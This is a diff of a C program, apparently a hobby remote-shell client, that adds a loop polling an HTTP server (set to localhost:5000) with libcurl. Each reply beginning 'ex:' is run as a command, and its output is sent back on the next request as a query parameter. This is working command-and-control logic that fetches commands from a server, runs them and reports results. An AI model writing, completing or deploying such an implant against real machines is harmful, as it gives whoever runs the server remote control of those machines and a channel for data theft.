@@ -14,7 +14,7 @@
 
 #define URL "http://localhost:5000"
 
-void getShell(char *cmd);
+char *getShell(char *cmd);
 char *postShell(char *cmd);
 char *executeCmd(char *cmd);
 
@@ -54,7 +54,21 @@ int main(int argc, char *argv[])
 	char *output = NULL;
 	switch (argv[1][0]) {
 	case 'g':
-		getShell(previous);
+		while (1) {
+			output = getShell(previous);
+			if (previous != NULL) {
+				free(previous);
+				previous = NULL;
+			}
+			if (output != NULL) {
+				previous = executeCmd(
+					output +
+					3); // pointer arithmetic go brrrr
+				free(output);
+			} else {
+				sleep(1);
+			}
+		}
 		break;
 	case 'p':
 		while (1) {
@@ -158,7 +172,7 @@ error:
 	return NULL;
 
 noex:
-	fprintf(stdout, "exit\n");
+	fprintf(stdout, "no execution\n");
 	free(response_data.buffer);
 	free(buffer);
 	curl_easy_cleanup(curl);
@@ -166,9 +180,64 @@ noex:
 }
 
 /* get request */
-void getShell(char *cmd)
+char *getShell(char *cmd)
 {
-	printf("%s\n", cmd);
-	fprintf(stderr, "not implemented");
-	return;
+	CURL *curl;
+	CURLcode res;
+	curl = curl_easy_init();
+	char *buffer;
+	if (cmd != NULL) {
+		char *escapedCMD = curl_easy_escape(curl, cmd, strlen(cmd));
+		buffer = calloc(strlen(escapedCMD) + strlen(URL) + 10,
+				sizeof(char));
+		sprintf(buffer, "%s?output=%s", URL, escapedCMD);
+		curl_free(escapedCMD);
+	} else {
+		buffer = calloc(strlen(URL) + 20, sizeof(char));
+		sprintf(buffer, "%s?output=nuthin", URL);
+	}
+
+	if (!curl) {
+		fprintf(stderr, "curl_easy_init() failed\n");
+		goto error;
+	}
+	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+	curl_easy_setopt(curl, CURLOPT_URL, buffer);
+
+	struct ResponseData response_data;
+	response_data.buffer = NULL;
+	response_data.size = 0;
+
+	curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
+	res = curl_easy_perform(curl);
+
+	if (res != CURLE_OK) {
+		fprintf(stderr, "curl_easy_perform() failed: %s\n",
+			curl_easy_strerror(res));
+		goto error;
+	}
+	if (response_data.size == 0 || response_data.buffer == NULL) {
+		fprintf(stderr, "No response data.\n");
+		goto error;
+	}
+
+	/* if the outputs first three characters are "ex:" then we know that the server is requesting we execute a command */
+	if (strncmp(response_data.buffer, "ex:", 3) == 0) {
+		free(buffer);
+		curl_easy_cleanup(curl);
+		return response_data.buffer;
+	} else {
+		goto noex;
+	}
+
+error:
+	fprintf(stderr, "error\n");
+	free(buffer);
+	curl_easy_cleanup(curl);
+	return NULL;
+noex:
+	fprintf(stdout, "no execution\n");
+	free(buffer);
+	curl_easy_cleanup(curl);
+	return NULL;
 }
